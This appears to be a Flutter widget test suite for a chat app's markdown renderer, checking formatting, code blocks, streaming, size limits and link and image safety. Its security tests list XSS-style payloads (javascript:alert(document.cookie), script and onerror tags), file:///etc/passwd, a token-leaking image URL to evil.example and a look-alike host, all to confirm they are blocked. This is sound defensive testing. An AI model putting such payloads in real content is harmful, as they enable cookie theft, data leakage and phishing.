import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:pai_mobile/models/chat.dart';
import 'package:pai_mobile/ui/chat/chat_screen.dart';
import 'package:pai_mobile/ui/theme/theme.dart';
import 'package:pai_mobile/ui/widgets/hud/hud.dart';
import 'package:pai_mobile/ui/widgets/markdown/markdown.dart';

import '../ui/golden_harness.dart';

// ---- helpers ---------------------------------------------------------------------------

/// 1x1 transparent PNG, so a "loaded" remote image decodes without any network.
final Uint8List _png = Uint8List.fromList(const [
  0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
  0x89, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9C, 0x63, 0xF8, 0xFF, 0xFF, 0x3F,
  0x00, 0x05, 0xFE, 0x02, 0xFE, 0xDC, 0xCC, 0x59, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,
  0x44, 0xAE, 0x42, 0x60, 0x82,
]);

class Harness {
  final List<Uri> launched = [];
  final List<Uri> imageRequests = [];
  final List<MethodCall> platformCalls = [];

  Future<bool> launcher(Uri u) async {
    launched.add(u);
    return true;
  }

  ImageProvider imageFactory(Uri u) {
    imageRequests.add(u);
    return MemoryImage(_png);
  }

  Future<void> pump(
    WidgetTester t,
    String data, {
    bool streaming = false,
    Size size = phone,
    double textScale = 1.0,
    Duration throttle = Duration.zero,
    MarkdownLimits limits = const MarkdownLimits(),
    bool settle = true, // false: no trailing 150 ms pump (needed to observe throttling)
  }) async {
    TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(
      SystemChannels.platform,
      (call) async {
        platformCalls.add(call);
        return null;
      },
    );
    addTearDown(() => TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger
        .setMockMethodCallHandler(SystemChannels.platform, null));
    final home = Scaffold(
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(12),
        child: MarkdownMessage(
          data: data,
          streaming: streaming,
          linkLauncher: launcher,
          imageProviderFactory: imageFactory,
          throttle: throttle,
          limits: limits,
        ),
      ),
    );
    if (settle) {
      await pumpHud(t, home, size: size, textScale: textScale);
    } else {
      t.view.physicalSize = size;
      t.view.devicePixelRatio = 1.0;
      addTearDown(t.view.reset);
      await t.pumpWidget(MaterialApp(
        theme: PaiTheme.dark(),
        builder: (c, child) => MediaQuery(
            data: MediaQuery.of(c).copyWith(disableAnimations: true), child: child!),
        home: home,
      ));
    }
  }

  String? get clipboard {
    final calls = platformCalls.where((c) => c.method == 'Clipboard.setData').toList();
    return calls.isEmpty ? null : (calls.last.arguments as Map)['text'] as String?;
  }
}

String allText(WidgetTester t) =>
    t.widgetList<RichText>(find.byType(RichText)).map((r) => r.text.toPlainText()).join('\n');

/// Every TextSpan in the tree whose text equals [label].
List<TextSpan> spansFor(WidgetTester t, String label) {
  final out = <TextSpan>[];
  for (final rt in t.widgetList<RichText>(find.byType(RichText))) {
    rt.text.visitChildren((s) {
      if (s is TextSpan && s.text == label) out.add(s);
      return true;
    });
  }
  return out;
}

TextStyle? styleOf(WidgetTester t, String label) {
  final spans = spansFor(t, label);
  return spans.isEmpty ? null : spans.first.style;
}

void main() {
  setUpAll(loadPaiFonts);
  setUp(() => HudBackground.debugFlat = true);
  tearDown(() => HudBackground.debugFlat = false);

  group('elements', () {
    testWidgets('headings, bold, italic, strike, inline code', (t) async {
      await Harness().pump(
          t, '# Big title\n\n## Sub title\n\nSome **bold**, *italic*, ~~gone~~ and `code` here.');
      expect(allText(t), contains('Big title'));
      expect(allText(t), isNot(contains('#')));
      expect(allText(t), isNot(contains('**')));
      expect(styleOf(t, 'bold')?.fontWeight, FontWeight.w700);
      expect(styleOf(t, 'italic')?.fontStyle, FontStyle.italic);
      expect(styleOf(t, 'gone')?.decoration, TextDecoration.lineThrough);
      expect(styleOf(t, 'code')?.fontFamily, contains('JetBrainsMono'));
      expect(styleOf(t, 'code')?.backgroundColor, isNotNull);
      final h1 = styleOf(t, 'Big title')!.fontSize!;
      final h2 = styleOf(t, 'Sub title')!.fontSize!;
      expect(h1, greaterThan(h2), reason: 'heading levels must differ');
    });

    testWidgets('unordered, ordered and nested lists', (t) async {
      await Harness().pump(t, '- alpha\n- beta\n  - nested one\n  - nested two\n\n1. first\n2. second');
      final text = allText(t);
      for (final s in ['alpha', 'beta', 'nested one', 'nested two', 'first', 'second', '1.', '2.']) {
        expect(text, contains(s));
      }
      expect(text, contains('•'));
      expect(text, isNot(contains('- alpha')));
    });

    testWidgets('task list renders checkboxes', (t) async {
      await Harness().pump(t, '- [x] done thing\n- [ ] todo thing');
      expect(find.byIcon(Icons.check_box), findsOneWidget);
      expect(find.byIcon(Icons.check_box_outline_blank), findsOneWidget);
      expect(allText(t), contains('done thing'));
    });

    testWidgets('blockquote and horizontal rule', (t) async {
      await Harness().pump(t, '> quoted words\n\n---\n\nafter');
      expect(allText(t), contains('quoted words'));
      bool leftBar(Widget w) =>
          w is DecoratedBox &&
          w.decoration is BoxDecoration &&
          ((w.decoration as BoxDecoration).border is Border) &&
          ((w.decoration as BoxDecoration).border as Border).left.width == 3;
      expect(find.byWidgetPredicate(leftBar), findsOneWidget);
      bool rule(Widget w) =>
          w is DecoratedBox &&
          w.decoration is BoxDecoration &&
          ((w.decoration as BoxDecoration).border is Border) &&
          ((w.decoration as BoxDecoration).border as Border).top.width == 1 &&
          ((w.decoration as BoxDecoration).border as Border).left.width == 0;
      expect(find.byWidgetPredicate(rule), findsWidgets);
    });

    testWidgets('paragraphs and single line breaks are preserved', (t) async {
      await Harness().pump(t, 'line one\nline two\n\nnew paragraph');
      expect(allText(t), contains('line one\nline two'));
      expect(allText(t), contains('new paragraph'));
    });

    testWidgets('table renders header + cells and scrolls horizontally when wide', (t) async {
      final h = Harness();
      final wide = '| ${List.generate(12, (i) => 'Column$i').join(' | ')} |\n'
          '|${List.filled(12, '---').join('|')}|\n'
          '| ${List.generate(12, (i) => 'value number $i is long').join(' | ')} |';
      await h.pump(t, wide);
      expect(find.byType(Table), findsOneWidget);
      expect(allText(t), contains('Column0'));
      final scroller = find.descendant(of: find.byType(MarkdownMessage), matching: find.byType(SingleChildScrollView));
      final horizontal = scroller.evaluate().map((e) => e.widget as SingleChildScrollView).where((s) => s.scrollDirection == Axis.horizontal);
      expect(horizontal, isNotEmpty);
      // Scrolling right reveals the last column.
      final tableScroll = find.byWidgetPredicate((w) => w is SingleChildScrollView && w.scrollDirection == Axis.horizontal).first;
      await t.drag(tableScroll, const Offset(-3000, 0));
      await t.pump();
      expect(allText(t), contains('Column11'));
    });

    testWidgets('normal small table shows header styling', (t) async {
      await Harness().pump(t, '| Name | Qty |\n|---|---:|\n| apples | 3 |\n| pears | 5 |');
      expect(find.byType(Table), findsOneWidget);
      expect(styleOf(t, 'Name')?.fontWeight, FontWeight.w700);
      expect(allText(t), contains('apples'));
    });

    testWidgets('everything is selectable (SelectionArea)', (t) async {
      await Harness().pump(t, 'Select **me**\n\n```\ncode\n```');
      expect(find.byType(SelectionArea), findsOneWidget);
    });
  });

  group('code blocks', () {
    testWidgets('language label, monospace content, horizontal scroll', (t) async {
      await Harness().pump(t, '```dart\nvoid main() { print("a very very long line that overflows the bubble width easily"); }\n```');
      expect(find.byType(CodeBlock), findsOneWidget);
      expect(find.text('DART'), findsOneWidget);
      expect(allText(t), contains('void main()'));
      final style = styleOf(t, 'void main() { print("a very very long line that overflows the bubble width easily"); }');
      expect(style?.fontFamily, contains('JetBrainsMono'));
    });

    testWidgets('block without a language is labelled CODE', (t) async {
      await Harness().pump(t, '```\nplain\n```');
      expect(find.text('CODE'), findsOneWidget);
    });

    testWidgets('copy button copies exactly the code and confirms', (t) async {
      final h = Harness();
      await h.pump(t, '```python\nprint("hi")\nx = 1\n```');
      await t.tap(find.byTooltip('Copy code'));
      await t.pump();
      expect(h.clipboard, 'print("hi")\nx = 1');
      expect(find.text('Code copied'), findsOneWidget);
      expect(find.byTooltip('Copied'), findsOneWidget);
      await t.pump(const Duration(seconds: 2));
    });

    testWidgets('copy button is at least 48x48', (t) async {
      await Harness().pump(t, '```\nx\n```');
      final size = t.getSize(find.byTooltip('Copy code'));
      expect(size.width, greaterThanOrEqualTo(48));
      expect(size.height, greaterThanOrEqualTo(48));
    });
  });

  group('links', () {
    const md = '[docs](https://example.com/page?a=1) trailing';

    testWidgets('a safe link is tappable and asks before opening, showing the real URL', (t) async {
      final h = Harness();
      await h.pump(t, md);
      expect(spansFor(t, 'docs').single.recognizer, isNotNull);
      await t.tapOnText(find.textRange.ofSubstring('docs'));
      await t.pumpAndSettle();
      expect(find.text('Open this link?'), findsOneWidget);
      expect(find.text('example.com'), findsOneWidget); // the host, prominently
      expect(find.textContaining('https://example.com/page?a=1'), findsWidgets); // the full URL
      expect(h.launched, isEmpty, reason: 'nothing may open before the user confirms');
      await t.tap(find.text('Open'));
      await t.pumpAndSettle();
      expect(h.launched, [Uri.parse('https://example.com/page?a=1')]);
    });

    testWidgets('cancel opens nothing, copy copies the URL and opens nothing', (t) async {
      final h = Harness();
      await h.pump(t, md);
      await t.tapOnText(find.textRange.ofSubstring('docs'));
      await t.pumpAndSettle();
      await t.tap(find.text('Cancel'));
      await t.pumpAndSettle();
      expect(h.launched, isEmpty);

      await t.tapOnText(find.textRange.ofSubstring('docs'));
      await t.pumpAndSettle();
      await t.tap(find.text('Copy link'));
      await t.pumpAndSettle();
      expect(h.clipboard, 'https://example.com/page?a=1');
      expect(h.launched, isEmpty);
      expect(find.text('Link copied'), findsOneWidget);
    });

    testWidgets('long-press shows the URL without opening anything', (t) async {
      final h = Harness();
      await h.pump(t, md);
      final topLeft = t.getTopLeft(find.byType(RichText).first);
      final g = await t.startGesture(topLeft + const Offset(6, 8));
      await t.pump(const Duration(milliseconds: 600));
      expect(find.text('https://example.com/page?a=1'), findsOneWidget); // snackbar
      await g.up();
      await t.pumpAndSettle();
      expect(find.text('Open this link?'), findsNothing, reason: 'a long-press must not also count as a tap');
      expect(h.launched, isEmpty);
    });

    final unsafe = <String, String>{
      'javascript': 'javascript:alert(document.cookie)',
      'data': 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'file': 'file:///etc/passwd',
      'intent': 'intent://evil#Intent;scheme=http;end',
      'custom': 'myapp://pay?to=evil',
    };
    for (final e in unsafe.entries) {
      testWidgets('${e.key}: link is inert text — not tappable, never opens', (t) async {
        final h = Harness();
        await h.pump(t, '[click me](${e.value})');
        expect(allText(t), contains('click me'));
        final spans = spansFor(t, 'click me');
        expect(spans, isNotEmpty);
        expect(spans.every((s) => s.recognizer == null), isTrue);
        await t.tapOnText(find.textRange.ofSubstring('click me'));
        await t.pumpAndSettle();
        expect(find.byType(AlertDialog), findsNothing);
        expect(h.launched, isEmpty);
      });
    }

    testWidgets('autolinks <javascript:...> and bare urls follow the same rules', (t) async {
      final h = Harness();
      await h.pump(t, '<javascript:alert(1)> and https://example.org/ok');
      expect(spansFor(t, 'javascript:alert(1)').every((s) => s.recognizer == null), isTrue);
      expect(spansFor(t, 'https://example.org/ok').single.recognizer, isNotNull);
    });

    testWidgets('mailto is allowed and shows the address', (t) async {
      final h = Harness();
      await h.pump(t, '[write me](mailto:me@example.com)');
      await t.tapOnText(find.textRange.ofSubstring('write me'));
      await t.pumpAndSettle();
      expect(find.text('Send an email to'), findsOneWidget);
      expect(find.text('me@example.com'), findsOneWidget);
    });

    testWidgets('look-alike (non-ASCII) host gets a warning and is shown decoded', (t) async {
      final h = Harness();
      await h.pump(t, '[bank](https://exаmple.com/login)');
      await t.tapOnText(find.textRange.ofSubstring('bank'));
      await t.pumpAndSettle();
      expect(find.textContaining('unusual characters'), findsOneWidget);
      expect(find.text('exаmple.com'), findsOneWidget);
    });
  });

  group('raw HTML is never interpreted', () {
    testWidgets('script/img/a tags are shown as literal text; nothing is created or fetched', (t) async {
      final h = Harness();
      await h.pump(t, '<script>alert(1)</script>\n\n<img src="https://evil.example/x.png" onerror="alert(1)">\n\n<a href="javascript:alert(1)">click</a>');
      // visible as text (not silently dropped) ...
      expect(allText(t), contains('<script>alert(1)</script>'));
      expect(allText(t), contains('<img src="https://evil.example/x.png" onerror="alert(1)">'));
      expect(allText(t), contains('<a href="javascript:alert(1)">click</a>'));
      // ... and inert
      expect(find.byType(Image), findsNothing);
      expect(find.byType(RemoteImagePlaceholder), findsNothing);
      expect(h.imageRequests, isEmpty);
      final tappable = t
          .widgetList<RichText>(find.byType(RichText))
          .expand((rt) {
            final spans = <TextSpan>[];
            rt.text.visitChildren((s) {
              if (s is TextSpan && s.recognizer != null) spans.add(s);
              return true;
            });
            return spans;
          });
      expect(tappable, isEmpty);
    });
  });

  group('remote images', () {
    const md = 'Look: ![the chart](https://evil.example/pixel.png?q=my-secret-token)';

    testWidgets('are NOT fetched; a placeholder with the host is shown', (t) async {
      final h = Harness();
      await h.pump(t, md);
      expect(find.textContaining('Image (tap to load)'), findsOneWidget);
      expect(find.textContaining('evil.example'), findsOneWidget);
      expect(find.byType(Image), findsNothing);
      expect(h.imageRequests, isEmpty, reason: 'no provider may even be created before the tap');
    });

    testWidgets('default provider path makes no HTTP client before the tap', (t) async {
      final recorder = _RecordingHttpOverrides();
      final previous = HttpOverrides.current;
      HttpOverrides.global = recorder;
      addTearDown(() => HttpOverrides.global = previous);
      await pumpHud(t, const Scaffold(body: MarkdownMessage(data: md)));
      await t.pump(const Duration(seconds: 1));
      expect(recorder.clientsCreated, 0);
    });

    testWidgets('load only on an explicit tap, exactly once, with the real URL', (t) async {
      final h = Harness();
      await h.pump(t, md);
      await t.tap(find.textContaining('Image (tap to load)'));
      await t.pump();
      await t.pump();
      expect(h.imageRequests, [Uri.parse('https://evil.example/pixel.png?q=my-secret-token')]);
      expect(find.byType(Image), findsOneWidget);
      expect(find.textContaining('Image (tap to load)'), findsNothing);
    });

    for (final u in ['file:///etc/passwd', 'data:image/png;base64,AAAA', 'content://a/b', 'ftp://x/y.png']) {
      testWidgets('non-http(s) image $u is blocked and cannot be loaded', (t) async {
        final h = Harness();
        await h.pump(t, '![x]($u)');
        expect(find.textContaining('Image blocked'), findsOneWidget);
        await t.tap(find.textContaining('Image blocked'), warnIfMissed: false);
        await t.pump();
        expect(h.imageRequests, isEmpty);
        expect(find.byType(Image), findsNothing);
      });
    }

    testWidgets('the placeholder is at least 48dp tall (touch target)', (t) async {
      await Harness().pump(t, md);
      final size = t.getSize(find.byType(InkWell).first);
      expect(size.height, greaterThanOrEqualTo(48));
    });
  });

  group('streaming', () {
    testWidgets('an open code fence renders as a code block, not as raw backticks', (t) async {
      await Harness().pump(t, 'Here:\n```py\nprint(', streaming: true);
      expect(find.byType(CodeBlock), findsOneWidget);
      expect(allText(t), isNot(contains('```')));
    });

    testWidgets('unclosed bold is displayed bold; final text is rendered EXACTLY', (t) async {
      final h = Harness();
      await h.pump(t, 'A **partial', streaming: true);
      expect(styleOf(t, 'partial')?.fontWeight, FontWeight.w700);
      expect(allText(t), isNot(contains('**')));
      await h.pump(t, 'A **partial', streaming: false); // stream ended: exact text, nothing "fixed"
      expect(allText(t), contains('A **partial'));
    });

    testWidgets('updates are coalesced while streaming and flush the instant streaming ends', (t) async {
      final h = Harness();
      const throttle = Duration(milliseconds: 50);
      await h.pump(t, 'Hello', streaming: true, throttle: throttle, settle: false);
      await h.pump(t, 'Hello world', streaming: true, throttle: throttle, settle: false);
      await t.pump(const Duration(milliseconds: 10));
      expect(allText(t), isNot(contains('world')), reason: 'still inside the throttle window');
      await t.pump(const Duration(milliseconds: 60));
      expect(allText(t), contains('Hello world'));

      for (var i = 0; i < 20; i++) {
        await h.pump(t, 'Hello world $i', streaming: true, throttle: throttle, settle: false);
      }
      await t.pump(const Duration(milliseconds: 60));
      expect(allText(t), contains('Hello world 19'));

      await h.pump(t, 'FINAL TEXT', streaming: false, throttle: throttle, settle: false);
      expect(allText(t), contains('FINAL TEXT'), reason: 'no waiting for the throttle at the end');
    });

    testWidgets('a stale throttle timer cannot overwrite the final text', (t) async {
      final h = Harness();
      const throttle = Duration(milliseconds: 50);
      await h.pump(t, 'one', streaming: true, throttle: throttle, settle: false);
      await h.pump(t, 'one two', streaming: true, throttle: throttle, settle: false); // timer armed
      await h.pump(t, 'one two three', streaming: false, throttle: throttle, settle: false);
      await t.pump(const Duration(milliseconds: 200));
      expect(allText(t), contains('one two three'));
    });

    testWidgets('every prefix of a rich message renders without errors', (t) async {
      const msg = '# T\n\n**b** `c` [l](https://e.com)\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```js\nlet a = 1;\n```\n\n> q';
      final h = Harness();
      for (var i = 0; i <= msg.length; i += 3) {
        await h.pump(t, msg.substring(0, i), streaming: true);
      }
      await h.pump(t, msg);
      expect(allText(t), contains('let a = 1;'));
    });
  });

  group('limits', () {
    testWidgets('very long replies are cut with "Show more", which reveals the rest', (t) async {
      final long = List.generate(600, (i) => 'Paragraph number $i with some filler words.').join('\n\n');
      expect(long.length, greaterThan(const MarkdownLimits().maxChars));
      final h = Harness();
      await h.pump(t, long);
      expect(find.textContaining('Show more'), findsOneWidget);
      expect(allText(t), isNot(contains('Paragraph number 599')));
      await t.ensureVisible(find.textContaining('Show more'));
      await t.tap(find.textContaining('Show more'));
      await t.pump();
      expect(find.textContaining('Show more'), findsNothing);
      expect(allText(t), contains('Paragraph number 599'));
    });

    testWidgets('a huge table is capped', (t) async {
      final rows = List.generate(600, (i) => '| r$i | v |').join('\n');
      await Harness().pump(t, '| a | b |\n|---|---|\n$rows');
      expect(allText(t), contains('more rows not shown'));
      expect(allText(t), isNot(contains('r599')));
    });
  });

  group('performance and pathological input', () {
    String mixed20k() {
      final block = '## Heading\n\nSome **bold** text with `code` and a [link](https://example.com).\n\n'
          '- one\n- two\n  - three\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```dart\nvoid f() {}\n```\n\n';
      return (block * 140).substring(0, 19900);
    }

    test('preparing 20k characters (close + escape HTML + bound) is fast, repeated per token', () {
      // This runs on every re-render while streaming, so it must be cheap. It is pure CPU work
      // and independent of the widget tree, so the bound is tight and not load-sensitive.
      final text = mixed20k();
      final sw = Stopwatch()..start();
      for (var i = 0; i < 20; i++) {
        boundMarkdown(escapeRawHtml(StreamingMarkdownPreprocessor.close(text)));
      }
      sw.stop();
      expect(sw.elapsedMilliseconds / 20, lessThan(150), reason: 'per-render preparation cost (ms)');
    });

    testWidgets('20k characters of mixed markdown render (hang guard, not a benchmark)', (t) async {
      // Wall-clock bounds on a shared CI box are noisy (this once measured 17 s while other
      // jobs saturated the CPU), so this only guards against hangs / quadratic blow-ups.
      final sw = Stopwatch()..start();
      await Harness().pump(t, mixed20k());
      sw.stop();
      expect(find.byType(MarkdownMessage), findsOneWidget);
      expect(t.takeException(), isNull);
      expect(sw.elapsed, lessThan(const Duration(seconds: 60)));
    }, timeout: const Timeout(Duration(seconds: 120)));

    final nasty = <String, String>{
      'asterisks': '*' * 19000,
      'open brackets': '[' * 19000,
      'underscores': '_a' * 9000,
      'backticks': '`' * 19000,
      'deep blockquote': '${'> ' * 4000}deep',
      'deep list indent': List.generate(300, (i) => '${' ' * (i * 2)}- item $i').join('\n'),
      'long single line': 'word ' * 3800,
      'link spam': '[a](https://e.com) ' * 1000,
      'table of empties': '|${' |' * 5000}\n|${'-|' * 5000}\n',
      'html bomb': '<div>' * 3000,
    };
    for (final e in nasty.entries) {
      testWidgets('survives: ${e.key}', (t) async {
        final sw = Stopwatch()..start();
        await Harness().pump(t, e.value);
        expect(t.takeException(), isNull);
        expect(sw.elapsed, lessThan(const Duration(seconds: 60)), reason: e.key);
      }, timeout: const Timeout(Duration(seconds: 120)));
    }
  });

  group('accessibility', () {
    testWidgets('1.3x text scale on a narrow screen: no overflow anywhere', (t) async {
      const rich = '# A fairly long heading that must wrap nicely\n\n'
          'Paragraph with **bold**, a [link with long text](https://example.com/some/long/path), `inline code that is long`.\n\n'
          '- item with quite a lot of text to wrap around\n  - nested item with more text\n\n'
          '- [x] task done and described at length\n\n'
          '> a quote that goes on for a while so that it wraps around\n\n'
          '| Column A | Column B | Column C |\n|---|---|---|\n| value a | value b | value c |\n\n'
          '```dart\nfinal veryLongVariableName = someFunction(argumentNumberOne, argumentNumberTwo);\n```\n\n'
          '![alt text](https://example.com/a.png)';
      await Harness().pump(t, rich, size: const Size(320, 700), textScale: 1.3);
      expect(t.takeException(), isNull);
      await t.pump(const Duration(milliseconds: 300));
      expect(t.takeException(), isNull);
    });
  });

  group('chat bubble', () {
    ChatMessage msg(String role, String content) =>
        ChatMessage(id: 'm', role: role, content: content, createdAt: DateTime(2026, 11, 23, 12));

    testWidgets('assistant messages are markdown, user messages are shown verbatim', (t) async {
      await pumpHud(
        t,
        Scaffold(
          body: Column(children: [
            ChatMessageBubble(message: msg('user', 'I typed **not bold** and `raw`'), streaming: false),
            ChatMessageBubble(message: msg('assistant', 'You wrote **bold** and `code`'), streaming: false),
          ]),
        ),
      );
      expect(find.text('I typed **not bold** and `raw`'), findsOneWidget); // literal
      expect(styleOf(t, 'bold')?.fontWeight, FontWeight.w700); // assistant rendered
      expect(allText(t), isNot(contains('You wrote **bold**')));
    });

    testWidgets('the blinking cursor shows only while streaming', (t) async {
      await pumpHud(t, Scaffold(body: ChatMessageBubble(message: msg('assistant', 'Thinking **ab'), streaming: true)));
      expect(find.byType(BlinkingCursor), findsOneWidget);
      await pumpHud(t, Scaffold(body: ChatMessageBubble(message: msg('assistant', 'Done'), streaming: false)));
      expect(find.byType(BlinkingCursor), findsNothing);
    });
  });
}

class _RecordingHttpOverrides extends HttpOverrides {
  int clientsCreated = 0;
  @override
  HttpClient createHttpClient(SecurityContext? context) {
    clientsCreated++;
    return super.createHttpClient(context);
  }
}
